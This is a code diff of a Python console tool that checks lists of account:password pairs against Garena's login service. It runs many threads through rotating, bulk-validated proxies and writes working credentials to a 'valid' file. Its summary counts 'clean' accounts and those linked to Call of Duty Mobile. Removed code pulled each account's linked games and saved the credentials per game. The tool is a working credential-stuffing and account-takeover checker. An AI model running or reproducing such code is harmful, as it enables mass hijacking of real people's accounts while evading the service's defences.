+            if v1 == 'NO_ACCOUNT':
+                result = 'invalid'
+                note = 'Account Not Found'
+            elif v1 == 'ERROR_AUTH':
+                result = 'invalid'
+                note = str(v2) if v2 else 'error_auth'
+            elif not v1 or not v2:
+                result = 'error'
+                note = 'Prelogin Failed'
+            else:
+                sso_key = login(session, account, password, v1, v2)
+                if sso_key and not (isinstance(sso_key, str) and sso_key.startswith('permanent_fail:')):
+                    result = 'valid'
+                    note = ''
+                else:
+                    result = 'invalid'
+                    note = 'Incorrect Password'
+        except Exception as e:
+            result = 'error'; note = type(e).__name__
+        with file_lock:
+            if result == 'valid':
+                valid_fh.write(f'{account}:{password}\n')
+            elif result == 'invalid':
+                invalid_fh.write(f'{account}:{password}\n')
+            else:
+                error_fh.write(f'{account}:{password}  | {note}\n')
+        with st_lock:
+            vl[result] += 1
+            vl['done'] += 1
+            done_now = vl['done']
+        _print_line(result, account, password, note)
+        if done_now % 5 == 0 or done_now == total:
+            _print_live_stats()
+    
+    console.print(Panel(Text(f"Output: {out_dir}", style="cyan"), border_style="cyan", box=box.ROUNDED, expand=False))
+    print()
+    
     try:
-        url = 'https://account.garena.com/api/account/bind'
-        headers = {
-            'accept': 'application/json, text/plain, */*',
-            'referer': 'https://account.garena.com/',
-            'user-agent': (
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
-                'AppleWebKit/537.36 (KHTML, like Gecko) '
-                'Chrome/129.0.0.0 Safari/537.36'
-            )
-        }
-        resp = session.get(url, headers=headers, timeout=12)
-        if resp.status_code != 200:
-            return found
-        data = resp.json()
-        binds = data.get('binds') or data.get('game_info') or []
-        for entry in binds:
-            gname = str(entry.get('game', '')).upper().strip()
-            if not gname:
-                continue
-            found.append({
-                'game': gname,
-                'role': entry.get('role') or entry.get('nickname') or 'N/A',
-                'region': entry.get('region') or entry.get('server') or 'N/A',
-                'uid': entry.get('uid', 'N/A')
-            })
-    except Exception:
-        pass
-    return found
+        with ThreadPoolExecutor(max_workers=num_threads) as ex:
+            futs = {ex.submit(_check_one, ap): ap for ap in accounts}
+            for fut in as_completed(futs):
+                if stop_ev.is_set():
+                    break
+                try:
+                    fut.result(timeout=8)
+                except Exception:
+                    pass
+    except KeyboardInterrupt:
+        stop_ev.set()
+        _log('WARNING', 'Stopping — flushing results…')
+    finally:
+        valid_fh.close(); invalid_fh.close(); error_fh.close()
+    
+    elapsed = max(time.time() - start_time, 0.001)
+    with st_lock:
+        v = vl['valid']; iv = vl['invalid']; er = vl['error']; dn = vl['done']
 
-def stash(account, password, account_data, game_connections, base_dir):
+    def _rich_bar(cnt, denom, color, bw=20):
+        if denom == 0:
+            return f"[dim]{'░' * bw}[/dim]"
+        f2 = int(cnt / denom * bw)
+        return f"[{color}]{'█' * f2}[/{color}][dim]{'░' * (bw - f2)}[/dim]"
+    
+    results_table = Table(title="[bold bright_yellow]⬡  VALIDATOR COMPLETE[/bold bright_yellow]", box=box.ROUNDED, border_style="bright_yellow", show_header=True, header_style="bold dim", padding=(0, 2), expand=False)
+    results_table.add_column("Category", style="dim", no_wrap=True, width=14)
+    results_table.add_column("Count", justify="right", style="bright_white", width=10)
+    results_table.add_column("Pct", justify="right", style="bright_yellow", width=8)
+    results_table.add_column("Bar", no_wrap=True)
+    
+    for label, cnt, color in [('✔  Valid', v, "bright_green"), ('✖  Invalid', iv, "bright_red"), ('·  Errors', er, "dim")]:
+        pct_s = f'{cnt / total * 100:.1f}%' if total else '0.0%'
+        results_table.add_row(f"[{color}]{label}[/{color}]", f"[{color}]{cnt:,}[/{color}]", pct_s, _rich_bar(cnt, total, color))
+    
+    console.print(results_table)
+    print()
+    
+    stats_panel = Panel(
+        Text(f"⏱  Time     {int(elapsed // 60)}m {int(elapsed % 60)}s\n", style="dim") +
+        Text(f"⚡  Rate     {dn / elapsed:.2f} acc/s\n", style="dim") +
+        Text(f"◈  Processed {dn:,}/{total:,}\n", style="dim") +
+        Text(f"✔  Valid    {valid_path}\n", style="cyan") +
+        Text(f"✖  Invalid  {invalid_path}\n", style="cyan") +
+        Text(f"·  Errors   {error_path}\n", style="cyan") +
+        Text("◈  Powered by @dvlist", style="bold cyan"),
+        border_style="bright_cyan", box=box.ROUNDED, expand=False
+    )
+    console.print(stats_panel)
+    print()
+    input(f'  {_DIM}↵ menu{_RST} ')
+
+def prompt_proxy_setup():
+    global proxy_manager
+    indent = "    "
+    clear_screen()
+    display_banner()
+
+    def _header(title, subtitle=None):
+        console.print(Panel(
+            Text(title, style="bold bright_white") if not subtitle
+            else Text(title, style="bold bright_white") + Text(f"\n{subtitle}", style="dim"),
+            border_style="bright_yellow", box=box.ROUNDED, expand=False
+        ))
+        print()
+
+    def _panel(content, border="bright_cyan"):
+        console.print(Panel(content, border_style=border, box=box.ROUNDED, expand=False))
+        print()
+
+    def _ok(msg):   console.print(indent + f"[bold green]  ✔ {msg}[/bold green]")
+    def _warn(msg): console.print(indent + f"[bold yellow]  ⚠ {msg}[/bold yellow]")
+    def _err(msg):  console.print(indent + f"[bold red]  ✖ {msg}[/bold red]")
+    def _info(msg): console.print(indent + f"  [bold cyan]{msg}[/bold cyan]")
+    def _ask(prompt, color="bold bright_cyan"):
+        return console.input(indent + f"[{color}]  ▸ {prompt}[/{color}]").strip()
+
+    _header("PROXY CONFIGURATION", "Configure how requests are routed")
+
+    mode_text = (
+        Text("  [1]  ", style="bold bright_cyan") + Text("Custom URL", style="bold white") +
+        Text("   – Single proxy, enter manually\n", style="dim") +
+        Text("  [2]  ", style="bold bright_cyan") + Text("Proxy File", style="bold white") +
+        Text("   – Load multiple proxies from a file\n", style="dim") +
+        Text("  [3]  ", style="bold bright_cyan") + Text("No Proxy  ", style="bold white") +
+        Text("   – Direct connection, no routing", style="dim")
+    )
+    _panel(mode_text)
+
+    while True:
+        choice = _ask("Select mode (1-3): ")
+        if choice in ("1", "2", "3"):
+            break
+        _err("Invalid choice. Enter 1, 2, or 3.")
+    print()
+
+    if choice == "1":
+        fmt_text = (
+            Text("Enter a proxy URL in any format.\n\n", style="bold bright_white") +
+            Text("  Supported protocols:\n", style="dim") +
+            Text("  HTTP    ", style="bold cyan") + Text("– standard proxy, most compatible\n", style="dim") +
+            Text("  HTTPS   ", style="bold cyan") + Text("– encrypted tunnel to proxy server\n", style="dim") +
+            Text("  SOCKS5  ", style="bold cyan") + Text("– lower level, faster, supports UDP\n", style="dim") +
+            Text("  SOCKS4  ", style="bold cyan") + Text("– legacy, no auth, TCP only\n\n", style="dim") +
+            Text("  Accepted formats:\n", style="dim") +
+            Text("  http://user:pass@host:port      ", style="cyan") + Text("← standard URL\n", style="dim") +
+            Text("  socks5://user:pass@host:port    ", style="cyan") + Text("← SOCKS5 with auth\n", style="dim") +
+            Text("  host:port:user:pass             ", style="cyan") + Text("← colon-separated\n", style="dim") +
+            Text("  user:pass@host:port             ", style="cyan") + Text("← auth prefix\n", style="dim") +
+            Text("  host:port                       ", style="cyan") + Text("← no auth\n\n", style="dim") +
+            Text("  No auth needed?  ", style="dim") + Text("Use host:port or http://host:port\n", style="cyan") +
+            Text("  Residential?     ", style="dim") + Text("Prefer SOCKS5 for better compatibility.\n", style="cyan") +
+            Text("  Datacenter?      ", style="dim") + Text("HTTP works fine for most cases.", style="cyan")
+        )
+        _panel(fmt_text)
+
+        url_input = _ask("Proxy URL (Enter to skip): ")
+        print()
+
+        if not url_input:
+            proxy_manager = ProxyManager(enabled=False)
+            _warn("No URL entered. Proxies disabled.")
+        else:
+            normalised = _parse_proxy_line(url_input)
+            if not normalised:
+                _err("Could not parse that format. Proxies disabled.")
+                proxy_manager = ProxyManager(enabled=False)
+            else:
+                val_text = (
+                    Text("Test this proxy before using it?\n\n", style="bold bright_white") +
+                    Text("  [Y]  ", style="bold green") + Text("Yes – verify connectivity and IP\n", style="dim") +
+                    Text("  [N]  ", style="bold yellow") + Text("No  – use as-is", style="dim")
+                )
+                _panel(val_text)
+                do_validate = _ask("Validate? (Y/n): ").lower()
+
+                if do_validate in ("", "y", "yes"):
+                    print()
+                    _info("🔍 Testing proxy…")
+                    ok, info, lat = _validate_proxy(normalised)
+                    _close_check_session()
+                    print()
+                    if ok:
+                        _ok(f"Proxy live.  IP: [cyan]{info}[/cyan]")
+                        _display_proxy_quality(1, 1, lat, indent)
+                        proxy_manager = ProxyManager(enabled=True, fallback_url=normalised)
+                    else:
+                        _err(f"Validation failed: [yellow]{info}[/yellow]")
+                        hint_map = {
+                            "auth_failed(407)":   "407 – Credentials rejected. Check username and password.",
+                            "auth_denied(403)":   "403 – Account suspended or IP not whitelisted.",
+                            "auth_denied(401)":   "401 – Invalid credentials.",
+                            "dns_fail":           "Cannot resolve hostname. Check the host in the URL.",
+                            "connection_refused": "Connection refused. Wrong port or server is down.",
+                            "connect_timeout":    "Timed out. Proxy may be overloaded or host is wrong.",
+                        }
+                        hint = next((v for k, v in hint_map.items() if info.startswith(k)),
+                                    "Proxy unreachable or blocked the check endpoint.")
+                        console.print(indent + f"  [dim]↳ {hint}[/dim]")
+                        print()
+
+                        force_text = (
+                            Text("Proxy failed validation.\n\n", style="bold yellow") +
+                            Text("  [Y]  ", style="bold yellow") + Text("Use it anyway\n", style="dim") +
+                            Text("  [N]  ", style="bold red") + Text("Disable proxies", style="dim")
+                        )
+                        _panel(force_text, border="yellow")
+                        force = _ask("Use anyway? (y/N): ", color="bold yellow").lower()
+
+                        if force in ("y", "yes"):
+                            proxy_manager = ProxyManager(enabled=True, fallback_url=normalised)
+                            _warn("Proxy set (unvalidated).")
+                        else:
+                            proxy_manager = ProxyManager(enabled=False)
+                            _warn("Proxies disabled.")
+                else:
+                    proxy_manager = ProxyManager(enabled=True, fallback_url=normalised)
+                    _ok("Custom proxy set (validation skipped).")
+
+    elif choice == "2":
+        file_text = (
+            Text("Enter path to a proxy file (one proxy per line).\n\n", style="bold bright_white") +
+            Text("  Supported protocols:\n", style="dim") +
+            Text("  HTTP    ", style="bold cyan") + Text("– standard proxy, most compatible\n", style="dim") +
+            Text("  HTTPS   ", style="bold cyan") + Text("– encrypted tunnel to proxy server\n", style="dim") +
+            Text("  SOCKS5  ", style="bold cyan") + Text("– lower level, faster, supports UDP\n", style="dim") +
+            Text("  SOCKS4  ", style="bold cyan") + Text("– legacy, no auth, TCP only\n\n", style="dim") +
+            Text("  Accepted formats:\n", style="dim") +
+            Text("  http://user:pass@host:port      ", style="cyan") + Text("← standard URL\n", style="dim") +
+            Text("  socks5://user:pass@host:port    ", style="cyan") + Text("← SOCKS5 with auth\n", style="dim") +
+            Text("  host:port:user:pass             ", style="cyan") + Text("← colon-separated\n", style="dim") +
+            Text("  user:pass@host:port             ", style="cyan") + Text("← auth prefix\n", style="dim") +
+            Text("  host:port                       ", style="cyan") + Text("← no auth\n\n", style="dim") +
+            Text("  File tips:\n", style="dim") +
+            Text("  #                               ", style="cyan") + Text("← lines starting with # are skipped\n", style="dim") +
+            Text("  Blank lines                     ", style="cyan") + Text("← ignored automatically\n", style="dim") +
+            Text("  Mixed formats                   ", style="cyan") + Text("← each line parsed independently\n\n", style="dim") +
+            Text("  No auth needed?  ", style="dim") + Text("Use host:port or http://host:port\n", style="cyan") +
+            Text("  Residential?     ", style="dim") + Text("Prefer SOCKS5 for better compatibility.\n", style="cyan") +
+            Text("  Datacenter?      ", style="dim") + Text("HTTP works fine for most cases.\n\n", style="cyan") +
+            Text("  Default: ", style="dim") + Text("proxies.txt", style="bold cyan") + Text(" in the current folder.", style="dim")
+        )
+        _panel(file_text)
+
+        file_input = _ask("File path (Enter for proxies.txt): ") or "proxies.txt"
+        print()
+
+        if not Path(file_input).is_file():
+            _err(f"File not found: '{file_input}'. Proxies disabled.")
+            proxy_manager = ProxyManager(enabled=False)
+        else:
+            raw_lines = Path(file_input).read_text(encoding="utf-8", errors="ignore").splitlines()
+            parsed_urls, skipped = [], 0
+            for line in raw_lines:
+                url = _parse_proxy_line(line)
+                if url:
+                    parsed_urls.append(url)
+                elif line.strip() and not line.strip().startswith("#"):
+                    skipped += 1
+
+            console.print(
+                indent +
+                f"  [bold cyan]Loaded:[/bold cyan]  "
+                f"[green]{len(parsed_urls)} proxies[/green]  "
+                f"[dim]│[/dim]  "
+                f"[yellow]{skipped} lines skipped[/yellow]"
+            )
+            print()
+
+            if not parsed_urls:
+                _warn("No valid proxies found. Proxies disabled.")
+                proxy_manager = ProxyManager(enabled=False)
+            else:
+                val_text = (
+                    Text("Validate all proxies?\n\n", style="bold bright_white") +
+                    Text("  [Y]  ", style="bold green") + Text("Yes – test each, keep only working ones\n", style="dim") +
+                    Text("  [N]  ", style="bold yellow") + Text("No  – use all as-is", style="dim")
+                )
+                _panel(val_text)
+                do_validate = _ask("Validate? (Y/n): ").lower()
+
+                if do_validate in ("", "y", "yes"):
+                    print()
+                    speed_text = (
+                        Text("Select validation speed.\n\n", style="bold bright_white") +
+                        Text("  [1]  ", style="bold cyan") + Text("Turbo   ", style="bold white") + Text("1000 threads, 4s timeout  – fastest, high RAM\n", style="dim") +
+                        Text("  [2]  ", style="bold cyan") + Text("Fast    ", style="bold white") + Text(" 500 threads, 5s timeout  – recommended\n", style="dim") +
+                        Text("  [3]  ", style="bold cyan") + Text("Normal  ", style="bold white") + Text(" 200 threads, 7s timeout  – stable\n", style="dim") +
+                        Text("  [4]  ", style="bold cyan") + Text("Slow    ", style="bold white") + Text("  50 threads, 10s timeout – low-end PC", style="dim")
+                    )
+                    _panel(speed_text)
+                    speed_choice = _ask("Speed (1-4, Enter = Fast): ")
+                    workers, timeout = {"1": (1000, 4.0), "2": (500, 5.0), "3": (200, 7.0), "4": (50, 10.0)}.get(speed_choice, (500, 5.0))
+                    print()
+
+                    console.print(
+                        indent +
+                        f"  [bold cyan]Validating:[/bold cyan]  "
+                        f"[yellow]{len(parsed_urls):,} proxies[/yellow]  "
+                        f"[dim]│[/dim]  [cyan]{workers} threads[/cyan]  "
+                        f"[dim]│  {timeout}s timeout[/dim]"
+                    )
+                    print()
+
+                    valid_urls = _validate_proxies_bulk(parsed_urls, timeout=timeout, max_workers=workers, indent=indent)
+                    _close_check_session()
+                    print()
+
+                    if not valid_urls:
+                        _err("No proxies passed validation. Proxies disabled.")
+                        proxy_manager = ProxyManager(enabled=False)
+                    else:
+                        save_text = (
+                            Text("Save working proxies back to file?\n\n", style="bold bright_white") +
+                            Text("  [Y]  ", style="bold green") + Text("Yes – overwrite file with working proxies only\n", style="dim") +
+                            Text("  [N]  ", style="bold yellow") + Text("No  – use working proxies this session only", style="dim")
+                        )
+                        _panel(save_text)
+                        save_back = _ask("Save back? (Y/n): ").lower()
+
+                        if save_back in ("", "y", "yes"):
+                            try:
+                                Path(file_input).write_text("\n".join(valid_urls) + "\n", encoding="utf-8")
+                                _ok(f"Saved [cyan]{len(valid_urls)}[/cyan] proxies to '[cyan]{file_input}[/cyan]'.")
+                            except Exception as e:
+                                _warn(f"Could not write file: {e}")
+
+                        proxy_manager = ProxyManager(enabled=True)
+                        proxy_manager.proxies = valid_urls
+                        _ok(f"Loaded [cyan]{len(valid_urls)}[/cyan] validated proxies.")
+                else:
+                    proxy_manager = ProxyManager(enabled=True)
+                    proxy_manager.proxies = parsed_urls
+                    _ok(f"Loaded [cyan]{len(parsed_urls)}[/cyan] proxies (validation skipped).")
+
+    else:
+        proxy_manager = ProxyManager(enabled=False)
+        _warn("Proxies disabled. Running direct.")
+
+    _close_check_session()
+    print()
     try:
-        gdir = Path(base_dir) / 'Games'
-        gdir.mkdir(parents=True, exist_ok=True)
-        for gc in game_connections:
-            gname = str(gc.get('game', 'Unknown')).strip() or 'Unknown'
-            safe = re.sub(r'[^A-Za-z0-9_-]+', '_', gname)
-            gpath = gdir / f'{safe}.txt'
-            line = (
-                f'{account}:{password} | '
-                f'role={gc.get("role", "N/A")} | '
-                f'region={gc.get("region", "N/A")} | '
-                f'uid={gc.get("uid", "N/A")}'
-            )
-            with open(gpath, 'a', encoding='utf-8') as f:
-                f.write(line + '\n')
-    except Exception:
-        pass
+        if proxy_manager and proxy_manager.enabled and proxy_manager.proxies:
+            console.print(indent + f"[dim]Probing first proxy against sso.garena.com…[/dim]")
+            _first = proxy_manager.proxies[0]
+            _ok, _reason, _lat = _probe_proxy_chain(_first, timeout=20.0)
+            if _ok:
+                console.print(indent + f"[bold green]  ✔ Proxy reachable[/bold green]  [dim]({_lat:.0f}ms)[/dim]")
+            else:
+                console.print(indent + f"[bold red]  ✖ Proxy cannot reach sso.garena.com:[/bold red] [yellow]{_reason}[/yellow]")
+                console.print(indent + f"[dim]  ↳ Auth may be wrong, plan expired, or service blocks Garena.[/dim]")
+                _force = input(indent + "  Continue anyway? (y/N): ").strip().lower()
+                if _force not in ('y', 'yes'):
+                    proxy_manager = ProxyManager(enabled=False)
+                    console.print(indent + f"[bold yellow]  ⚠  Proxies disabled[/bold yellow]")
+    except Exception as _pe:
+        console.print(indent + f"[dim]  Probe skipped: {_pe}[/dim]")
+    print()
+    input(indent + "Press Enter to continue...")
 
-localp = threading.local()
-relay = None
 
-def interpret(raw: str):
+_proxy_check_local = threading.local()
+
+
+def _get_check_session() -> requests.Session:
+    if not hasattr(_proxy_check_local, "session"):
+        s = requests.Session()
+        adapter = requests.adapters.HTTPAdapter(
+            pool_connections=1,
+            pool_maxsize=1,
+            max_retries=0,
+            pool_block=False
+        )
+        s.mount("http://", adapter)
+        s.mount("https://", adapter)
+        _proxy_check_local.session = s
+    return _proxy_check_local.session
+
+def _close_check_session() -> None:
+    if hasattr(_proxy_check_local, "session"):
+        try:
+            _proxy_check_local.session.close()
+        except Exception:
+            pass
+        del _proxy_check_local.session
+
+def _parse_proxy_line(raw: str) -> Optional[str]:
     raw = raw.strip()
     if not raw or raw.startswith("#"):
         return None
@@ -3897,52 +3977,49 @@ def interpret(raw: str):
             user, pw, host, port = a, b, c, d
         else:
             return None
-        return (
-            f"http://{urllib.parse.quote(user, safe='-._~')}:"
-            f"{urllib.parse.quote(pw, safe='-._~')}@{host}:{port}"
-        )
+        return f"http://{urllib.parse.quote(user, safe='-._~')}:{urllib.parse.quote(pw, safe='-._~')}@{host}:{port}"
     return None
 
-def grade(url: str, edge: float = 5.0):
+def _validate_proxy(url: str, timeout: float = 5.0) -> Tuple[bool, str, float]:
     try:
         parsed = urllib.parse.urlparse(url)
-        host = parsed.hostname or ""
-        port = parsed.port or 8080
-        if not host:
+        proxy_host = parsed.hostname or ""
+        proxy_port = parsed.port or 8080
+        if not proxy_host:
             return False, "no_host", -1.0
-        user = urllib.parse.unquote(parsed.username or "")
-        pw = urllib.parse.unquote(parsed.password or "")
+        raw_user = urllib.parse.unquote(parsed.username or "")
+        raw_pass = urllib.parse.unquote(parsed.password or "")
     except Exception:
         return False, "parse_err", -1.0
 
-    auth = None
-    if user:
-        creds = f"{user}:{pw}".encode()
-        auth = f"Basic {base64.b64encode(creds).decode()}"
+    proxy_auth = None
+    if raw_user:
+        credentials = f"{raw_user}:{raw_pass}".encode()
+        proxy_auth = f"Basic {base64.b64encode(credentials).decode()}"
 
     last_err = "dead"
     sock = None
 
-    for host_t, port_t, path_t in [
+    for target_host, target_port, target_path in [
         ("ip-api.com", 80, "/json/?fields=query,status"),
         ("api.ipify.org", 80, "/?format=json")
     ]:
         sock = None
         try:
             t0 = time.monotonic()
-            sock = socket.create_connection((host, port), timeout=edge)
-            sock.settimeout(edge)
+            sock = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
+            sock.settimeout(timeout)
 
-            lines = [
-                f"GET http://{host_t}{path_t} HTTP/1.1",
-                f"Host: {host_t}",
+            req_lines = [
+                f"GET http://{target_host}{target_path} HTTP/1.1",
+                f"Host: {target_host}",
                 "Accept: application/json",
                 "Connection: close"
             ]
-            if auth:
-                lines.append(f"Proxy-Authorization: {auth}")
+            if proxy_auth:
+                req_lines.append(f"Proxy-Authorization: {proxy_auth}")
 
-            sock.sendall("\r\n".join(lines + ["", ""]).encode())
+            sock.sendall("\r\n".join(req_lines + ["", ""]).encode())
 
             data = b""
             while len(data) < 4096:
@@ -3954,40 +4031,27 @@ def grade(url: str, edge: float = 5.0):
                     break
 
             latency_ms = (time.monotonic() - t0) * 1000
-            status_line = (
-                data.decode(errors="replace").split("\r\n", 1)[0]
-                if data else ""
-            )
+            status_line = data.decode(errors="replace").split("\r\n", 1)[0] if data else ""
             parts = status_line.split(" ", 2)
-            code = (
-                int(parts[1])
-                if len(parts) >= 2 and parts[1].isdigit()
-                else 0
-            )
+            status_code = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0
 
-            if code == 200:
-                body = (
-                    data.decode(errors="replace")
-                    .split("\r\n\r\n", 1)[-1]
-                    .strip()
-                )
+            if status_code == 200:
+                body = data.decode(errors="replace").split("\r\n\r\n", 1)[-1].strip()
                 if body and body[0] in "0123456789abcdefABCDEF":
                     body = body.split("\r\n", 1)[-1].split("\r\n")[0].strip()
                 try:
                     jdata = json.loads(body)
-                    ip = str(
-                        jdata.get("query") or jdata.get("ip") or "?"
-                    ).split(",")[0].strip()
+                    ip = str(jdata.get("query") or jdata.get("ip") or "?").split(",")[0].strip()
                     return True, ip, latency_ms
                 except Exception:
                     return True, "alive(no-ip)", latency_ms
 
-            if code == 407:
+            if status_code == 407:
                 last_err = "auth_failed(407)"
-            elif code in (401, 403):
-                last_err = f"auth_denied({code})"
-            elif code:
-                last_err = f"http_{code}"
+            elif status_code in (401, 403):
+                last_err = f"auth_denied({status_code})"
+            elif status_code:
+                last_err = f"http_{status_code}"
 
         except socket.timeout:
             last_err = "connect_timeout"
@@ -4011,17 +4075,11 @@ def grade(url: str, edge: float = 5.0):
                     pass
                 sock = None
 
-    if last_err not in (
-        "auth_failed(407)",
-        "auth_denied(403)",
-        "auth_denied(401)",
-        "dns_fail",
-        "connection_refused"
-    ):
+    if last_err not in ("auth_failed(407)", "auth_denied(403)", "auth_denied(401)", "dns_fail", "connection_refused"):
         sock = None
         try:
             t0 = time.monotonic()
-            sock = socket.create_connection((host, port), timeout=edge)
+            sock = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
             latency_ms = (time.monotonic() - t0) * 1000
             return True, f"alive(no-ip,{last_err})", latency_ms
         except Exception:
@@ -4036,10 +4094,825 @@ def grade(url: str, edge: float = 5.0):
 
     return False, last_err, -1.0
 
-def reach(url, edge=15.0):
-    import ssl as sslmod
+def _display_proxy_quality(valid_count, total_count, avg_latency_ms, indent="    "):
+    if not total_count:
+        return
+
+    sr = (valid_count / total_count) * 100
+
+    if sr >= 50 and 0 < avg_latency_ms <= 1500:
+        tier, tc, bar_color = "HIGH",   "bold bright_green", "bright_green"
+        icon, rec, note     = "🟢",     "up to 20",          "Proxies are fast and reliable. Push thread count high."
+    elif sr >= 30 or (0 < avg_latency_ms <= 2500):
+        tier, tc, bar_color = "MEDIUM", "bold yellow",        "yellow"
+        icon, rec, note     = "🟡",     "8 – 12",             "Acceptable pool. Balance threads to avoid timeouts."
+    else:
+        tier, tc, bar_color = "LOW",    "bold red",            "red"
+        icon, rec, note     = "🔴",     "3 – 5",              "Pool is weak. Low threads reduce wasted retries."
+
+    lat   = f"{avg_latency_ms:.0f} ms" if avg_latency_ms > 0 else "N/A"
+    BW    = 24
+
+    def _bar(pct, width=BW, color="bright_green"):
+        filled = int(pct / 100 * width)
+        return (
+            f"[{color}]{'█' * filled}[/{color}]"
+            f"[dim]{'░' * (width - filled)}[/dim]"
+        )
+
+    def _lat_bar(ms, width=BW):
+        if ms <= 0:
+            return f"[dim]{'░' * width}[/dim]"
+        capped = min(ms, 3000)
+        filled = int(capped / 3000 * width)
+        color  = "bright_green" if ms <= 800 else "yellow" if ms <= 1800 else "red"
+        return (
+            f"[{color}]{'█' * filled}[/{color}]"
+            f"[dim]{'░' * (width - filled)}[/dim]"
+        )
+
+    lat_hint = (
+        "[bright_green]Excellent[/bright_green]" if 0 < avg_latency_ms <= 800  else
+        "[yellow]Acceptable[/yellow]"             if avg_latency_ms <= 1800     else
+        "[red]Slow[/red]"                         if avg_latency_ms > 1800      else
+        "[dim]N/A[/dim]"
+    )
+
+    table = Table(show_header=False, box=None, padding=(0, 1), expand=False)
+    table.add_column(style="dim", width=22)
+    table.add_column(style="white", width=36)
+
+    table.add_row(
+        "  Quality Tier",
+        f"[{tc}]{icon}  {tier}[/{tc}]"
+    )
+    table.add_row("", "")
+    table.add_row(
+        "  Success Rate",
+        f"[bold]{sr:.1f}%[/bold]  [dim]({valid_count:,} / {total_count:,})[/dim]"
+    )
+    table.add_row("", _bar(sr, color=bar_color))
+    table.add_row("", "")
+    table.add_row(
+        "  Avg Latency",
+        f"[bold]{lat}[/bold]  [dim]{lat_hint}[/dim]"
+    )
+    table.add_row("", _lat_bar(avg_latency_ms))
+    table.add_row("", "")
+    table.add_row(
+        "  Rec. Threads",
+        f"[bold cyan]{rec}[/bold cyan]"
+    )
+    table.add_row(
+        "  Advice",
+        f"[dim]{note}[/dim]"
+    )
+
+    console.print()
+    console.print(Panel(
+        table,
+        title=f"[bold bright_white] PROXY QUALITY REPORT [/bold bright_white]",
+        subtitle=f"[{tc}] {tier} TIER [/{tc}]",
+        border_style=bar_color,
+        padding=(1, 2),
+        expand=False
+    ))
+    console.print()
+
+def _validate_proxies_bulk(urls: List[str], timeout: float = 5.0, max_workers: int = 500, indent: str = "    ") -> List[str]:
+    total = len(urls)
+    workers = min(max_workers, max(total, 1))
+    valid = []
+    invalid = []
+    latencies = []
+    lock = threading.Lock()
+    start_time = time.monotonic()
+
+    progress = Progress(
+        SpinnerColumn(),
+        TextColumn("[bold cyan]Validating"),
+        BarColumn(bar_width=30),
+        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
+        MofNCompleteColumn(),
+        TextColumn("│ [green]{task.fields[valid]}✔[/green] [red]{task.fields[invalid]}✖[/red]"),
+        TimeElapsedColumn(),
+        TextColumn("ETA"),
+        TimeRemainingColumn(),
+        console=console,
+        refresh_per_second=12
+    )
+
+    with progress:
+        task = progress.add_task(
+            "Validating",
+            total=total,
+            valid=0,
+            invalid=0
+        )
+
+        def _check_one(url: str) -> None:
+            ok, _, lat = _validate_proxy(url, timeout=timeout)
+            with lock:
+                if ok:
+                    valid.append(url)
+                    if lat > 0:
+                        latencies.append(lat)
+                else:
+                    invalid.append(url)
+                progress.update(
+                    task,
+                    completed=len(valid) + len(invalid),
+                    valid=len(valid),
+                    invalid=len(invalid)
+                )
+
+        def _wrapped_check(url: str) -> None:
+            try:
+                _check_one(url)
+            finally:
+                _close_check_session()
+
+        with ThreadPoolExecutor(max_workers=workers) as executor:
+            futures = [executor.submit(_wrapped_check, u) for u in urls]
+            for future in as_completed(futures):
+                try:
+                    future.result()
+                except Exception:
+                    pass
+
+    _close_check_session()
+
+    avg_speed = total / max(time.monotonic() - start_time, 0.001)
+    console.print(f"\n{indent}  [bold green]✔ Valid: {len(valid):,}[/bold green]   [bold red]✖ Dead: {len(invalid):,}[/bold red]   [dim]│  ~{avg_speed:.0f}/s[/dim]")
+
+    avg_lat = (sum(latencies) / len(latencies)) if latencies else -1.0
+    _display_proxy_quality(len(valid), total, avg_lat, indent)
+
+    return valid
+
+def _display_final_summary(live_stats: 'LiveStats', label: str = 'SESSION COMPLETE'):
+    from rich.console import Console
+    from rich.panel import Panel
+    from rich.table import Table
+    from rich.text import Text
+    from rich.padding import Padding
+    from rich import box
+
+    console = Console()
+    stats = live_stats.get_stats()
+    elapsed = max(time.time() - live_stats.start_time, 0.001)
+    proc = live_stats.get_processed_count()
+    rate = proc / elapsed
+    total = live_stats.total_accounts
+
+    overview_text = Text()
+    overview_text.append("Total Processed: ", style="cyan")
+    overview_text.append(f"{proc}/{total}   ", style="bright_cyan")
+    overview_text.append("|   Elapsed Time: ", style="cyan")
+    overview_text.append(f"{int(elapsed//60)}m {int(elapsed%60)}s   ", style="bright_cyan")
+    overview_text.append("|   Average Speed: ", style="cyan")
+    overview_text.append(f"{rate:.2f} acc/s", style="bright_cyan")
+
+    overview_panel = Panel(overview_text, title=f"📊 [bold green]{label}[/bold green]", border_style="green", expand=False)
+
+    status_table = Table(box=box.SIMPLE_HEAVY, border_style="cyan", header_style="bold white", expand=False, show_lines=False)
+    status_table.add_column("Category", style="bright_cyan")
+    status_table.add_column("Count", justify="right", style="white")
+    status_table.add_column("Percentage", justify="right", style="green")
+    status_table.add_column("Visual")
+
+    def add_row(title, count, base_total, color):
+        pct = (count / base_total * 100) if base_total > 0 else 0
+        bar_len = int((count / max(base_total, 1)) * 20)
+        bar = f"[{color}]{'█' * bar_len}[/{color}]"
+        status_table.add_row(f"[{color}]{title}[/{color}]", str(count), f"{pct:.1f}%", bar)
+
+    add_row("✔ Valid", stats['valid'], total, "green")
+    add_row("✖ Invalid", stats['invalid'], total, "red")
+    add_row("· Errors", stats['error'], total, "dim")
+    status_table.add_row("", "", "", "")
+    ct = max(stats['valid'], 1)
+    add_row("✦ Clean", stats['clean'], ct, "green")
+    add_row("⊘ Not Clean", stats['not_clean'], ct, "yellow")
+    add_row("◈ Has CODM", stats['has_codm'], ct, "#38d9c8")
+    add_row("○ No CODM", stats['no_codm'], ct, "color(139)")
+
+    status_panel = Panel(status_table, title="🎯 [italic cyan]Session Results[/italic cyan]", border_style="cyan", expand=False)
+
+    level_table = Table(box=box.SIMPLE_HEAVY, border_style="cyan", header_style="bold white", expand=False, show_lines=False)
+    level_table.add_column("Level Range", style="cyan")
+    level_table.add_column("Clean", justify="right", style="green")
+    level_table.add_column("Visual (Clean)", style="green")
+    level_table.add_column("Not Clean", justify="right", style="yellow")
+    level_table.add_column("Visual (NC)", style="yellow")
+
+    clean_lvl = stats['clean_level_counts']
+    nc_lvl = stats['not_clean_level_counts']
+    c_tot = max(stats['clean'], 1)
